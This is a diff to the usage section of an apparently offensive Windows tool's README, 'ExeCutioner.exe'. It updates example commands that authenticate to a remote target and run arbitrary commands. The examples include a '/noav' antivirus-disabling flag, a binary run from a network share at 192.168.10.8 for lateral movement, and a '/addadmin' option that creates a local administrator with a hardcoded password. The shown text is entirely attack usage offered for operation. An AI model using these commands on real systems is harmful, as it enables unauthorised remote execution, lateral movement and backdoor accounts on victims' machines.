@@ -41,13 +41,13 @@ ExeCutioner.exe /t <target name or IP> /user <username> /pass <password> /domain
 ExeCutioner.exe /t <target name or IP> /syscreds true /noav true
 
 //Authenticate to target with current user token and execute command
-ExeCutioner.exe /t <target name or IP> /cmd <command-to-run-in-qoutes>
+ExeCutioner.exe /t <target name or IP> /syscreds /cmd <command-to-run-in-qoutes>
 
 //Authenticate to target with current user token and execute binary for lateral movement
-ExeCutioner.exe /t <target name or IP> /cmd <\\192.168.10.8\\lateralmovement.exe>
+ExeCutioner.exe /t <target name or IP> /syscreds /cmd <\\192.168.10.8\\lateralmovement.exe>
 
 //Authenticate to target with current user token and add a new Local Administrator - username "newguy" with password "MakeLife123"
-ExeCutioner.exe /t <target name or IP> /cmd <\\192.168.10.8\\lateralmovement.exe>
+ExeCutioner.exe /t <target name or IP> /syscreds /addadmin true
 ```
 
 # Credits
